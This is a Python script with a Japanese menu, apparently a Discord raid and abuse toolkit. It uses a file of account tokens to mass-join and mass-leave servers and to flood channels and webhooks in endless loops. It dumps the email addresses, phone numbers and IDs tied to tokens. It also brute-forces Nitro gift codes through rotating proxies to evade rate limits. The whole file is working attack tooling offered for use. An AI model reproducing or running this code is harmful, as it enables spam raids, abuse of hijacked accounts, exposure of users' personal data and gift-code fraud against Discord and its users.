import discord
import requests
import string
import secrets
import random
import json
import time
import re
from rich import print
from rich.console import Console
from rich.table import Table

http_proxy = []
https_proxy = []

http_proxy_open = open("http-proxy.txt", "r")
for proxy in http_proxy_open:
	http_proxy.append(proxy.replace("\n", ""))
http_proxy_open.close()

https_proxy_open = open("https-proxy.txt", "r")
for proxy in https_proxy_open:
	https_proxy.append(proxy.replace("\n", ""))
https_proxy_open.close()

client = discord.Client()
console = Console()
mainmenu = Table(show_header=True, header_style="green")
tokenview = Table(show_header=True, header_style="green")
nitrotools = Table(show_header=True, header_style="green")
nitroproxy = Table(show_header=True, header_style="green")

def join(code, token):
	headers = {'authorization': f'{token}'}
	requests.post(f"https://discordapp.com/api/v6/invites/{code}", headers=headers)

def wspam(url, msg, name):
	data = {
		"username": f"{name}",
		"content": f"{msg}"
	}
	while True:
		requests.post(url, data=data)

def left(id, token):
	@client.event
	async def on_ready():
		guild = await client.fetch_guild(int(id))
		await guild.leave()
		exit()
	client.run(f"{token}", bot=False)

def spam(id, msg, token):
	@client.event
	async def on_ready():
		channel = await client.fetch_channel(int(id))
		await channel.send(f"{msg}")
	@client.event
	async def on_message(message):
		if message.content == str(msg):
			channel = await client.fetch_channel(int(id))
			await channel.send(f"{msg}")
	client.run(f"{token}", bot=False)

def check(token):
	api_url = "https://discordapp.com/api/v6/users/@me"
	headers = {"authorization": f"{token}"}
	res = requests.get(api_url, headers=headers)
	response = res.json()
	Tag = response["discriminator"]
	Email = response["email"]
	UserID = response["id"]
	Lang = response["locale"]
	PhoneNumber = response["phone"]
	UserName = response["username"]
	Verify = response["verified"]
	print(f"""
	Token: {token}
	設定言語: {Lang}
	ユーザータグ: {UserName}#{Tag}
	ユーザーID: {UserID}
	認証ステータス: {Verify}
	登録電話番号: {PhoneNumber}
	登録メールアドレス: {Email}
	""")

def nitro(type, arg=None):
	if type == "generate":
		count = 0
		amount = int(arg)
		while count < amount:
			chars = string.ascii_uppercase + string.ascii_lowercase + string.digits
			result = ''.join(secrets.choice(chars) for x in range(16))
			print(result)
			save = open("nitro.txt", "a")
			save.write(result + "\n")
			save.close()
			count += 1
	elif type == "check":
		if arg == "use":
			codes = open("nitro.txt", "r")
			for code in codes:
				random.shuffle(http_proxy)
				random.shuffle(https_proxy)
				HTTP_P = http_proxy[0]
				HTTPS_P = https_proxy[0]
				result = code.replace("\n", "")
				proxies = {
					"http": f"{HTTP_P}",
					"https": f"{HTTPS_P}"
				}
				response = requests.get(f"https://discordapp.com/api/v6/entitlements/gift-codes/{result}", proxies=proxies)
				GetJson = response.json()
				RateLimit = GetJson["message"]
				if response.status_code == 200:
					print(f"[green]ActiveNitro: {result}[/green]")
				elif RateLimit == "You are being rate limited.":
					print(f"[red]Check failed: {result}[/red]")
				else:
					print(f"[red]InActiveNitro: {result}[/red]")
		elif arg == "less":
			codes = open("nitro.txt", "r")
			for code in codes:
				result = code.replace("\n", "")
				response = requests.get(f"https://discordapp.com/api/v6/entitlements/gift-codes/{result}")
				GetResponse = response.json()
				Failed = GetResponse["message"]
				if response.status_code == 200:
					print(f"[green]ActiveNitro: {result}[/green]")
				elif Failed == "You are being rate limited.":
					print(f"[red]Failed: {result}[/red]")
					print("リクエストが拒否されました。")
					print("120秒間処理を一時停止します。")
					time.sleep(120)
				else:
					print(f"[red]InActiveNitro: {result}[/red]")

print("""[cyan]
██████╗░██╗░██████╗░█████╗░░█████╗░██████╗░██████╗░  ████████╗░█████╗░░█████╗░██╗░░░░░
██╔══██╗██║██╔════╝██╔══██╗██╔══██╗██╔══██╗██╔══██╗  ╚══██╔══╝██╔══██╗██╔══██╗██║░░░░░
██║░░██║██║╚█████╗░██║░░╚═╝██║░░██║██████╔╝██║░░██║  ░░░██║░░░██║░░██║██║░░██║██║░░░░░
██║░░██║██║░╚═══██╗██║░░██╗██║░░██║██╔══██╗██║░░██║  ░░░██║░░░██║░░██║██║░░██║██║░░░░░
██████╔╝██║██████╔╝╚█████╔╝╚█████╔╝██║░░██║██████╔╝  ░░░██║░░░╚█████╔╝╚█████╔╝███████╗
╚═════╝░╚═╝╚═════╝░░╚════╝░░╚════╝░╚═╝░░╚═╝╚═════╝░  ░░░╚═╝░░░░╚════╝░░╚════╝░╚══════╝
[/cyan]""")

mainmenu.add_column("Number", style="cyan")
mainmenu.add_column("Name", style="cyan")
mainmenu.add_column("Description", style="cyan")

mainmenu.add_row(
	"[green]1[/green]",
	"[green]Join flood[/green]",
	"[green]アカウントをサーバーへ参加させます。[/green]"
)
mainmenu.add_row(
	"[green]2[/green]",
	"[green]Leave flood[/green]",
	"[green]アカウントをサーバーから退出されます。[/green]"
)
mainmenu.add_row(
	"[green]3[/green]",
	"[green]Spammer[/green]",
	"[green]特定のチャンネルでスパムを行います。[/green]"
)
mainmenu.add_row(
	"[green]4[/green]",
	"[green]Webhook spammer[/green]",
	"[green]Webhookに大量のメッセージ送信のリクエストを送信します。[green]"
)
mainmenu.add_row(
	"[green]5[/green]",
	"[green]Token infomation[/green]",
	"[green]指定したTokenの情報を見ることができます。[/green]"
)
mainmenu.add_row(
	"[green]6[/green]",
	"[green]Nitro tools[/green]",
	"[green]Nitroの生成やチェックを行えます。[/green]"
)

console.print(mainmenu)

select = input("> ")

if select == "1":
	invite_code = input("招待コード: ")
	tokens = open("tokens.txt", "r")
	for token in tokens:
		t = token.replace("\n", "")
		join(invite_code, t)
elif select == "2":
	guild_id = input("サーバーID: ")
	tokens = open("tokens.txt", "r")
	for token in tokens:
		t = token.replace("\n", "")
		left(guild_id, t)
elif select == "3":
	channel_id = input("チャンネルID: ")
	message = input("送信メッセージ: ")
	tokens = open("tokens.txt", "r")
	for token in tokens:
		t = token.replace("\n", "")
		spam(channel_id, message, t)
elif select == "4":
	webhook_url = input("WebhookURL: ")
	message = input("送信メッセージ: ")
	name = input("Webhookの名前: ")
	wspam(webhook_url, message, name)
elif select == "5":
	tokenview.add_column("Number", style="cyan")
	tokenview.add_column("Name", style="cyan")
	tokenview.add_row(
		"[green]1[/green]",
		"[green]特定のTokenのみ[/green]"
	)
	tokenview.add_row(
		"[green]2[/green]",
		"[green]設定してあるToken全て[/green]"
	)
	console.print(tokenview)
	token_info_select = input("> ")
	if token_info_select == "1":
		tokens = input("Token: ")
		check(tokens)
	elif token_info_select == "2":
		tokens = open("tokens.txt", "r")
		for token in tokens:
			t = token.replace("\n", "")
			check(token)
	else:
		print("番号が無効です。")
		print("10秒後にプログラムが終了します。")
		time.sleep(10)
		exit()
elif select == "6":
	nitrotools.add_column("Number", style="cyan")
	nitrotools.add_column("Name", style="cyan")
	nitrotools.add_row(
		"[green]1[/green]",
		"[green]Generate[/green]"
	)
	nitrotools.add_row(
		"[green]2[/green]",
		"[green]Check[/green]"
	)
	print(nitrotools)
	nitro_select = input("> ")
	if nitro_select == "1":
		amount = input("生成個数: ")
		nitro("generate", amount)
	elif nitro_select == "2":
		nitroproxy.add_column("Number", style="cyan")
		nitroproxy.add_column("Name", style="cyan")
		nitroproxy.add_row(
			"[green]1[/green]",
			"[green]Proxy使用"
		)
		nitroproxy.add_row(
			"[green]2[/green]",
			"[green]ProxyLess"
		)
		print(nitroproxy)
		nitroproxy_select = input("> ")
		if nitroproxy_select == "1":
			nitro("check", "use")
		elif nitroproxy_select == "2":
			nitro("check", "less")
		else:
			print("番号が無効です。")
			print("10秒後にプログラムが終了します。")
	else:
		print("番号が無効です。")
		print("10秒後にプログラムが終了します。")
		time.sleep(10)
		exit()
else:
	print("番号が無効です。")
	print("10秒後にプログラムが終了します。")
	time.sleep(10)
	exit()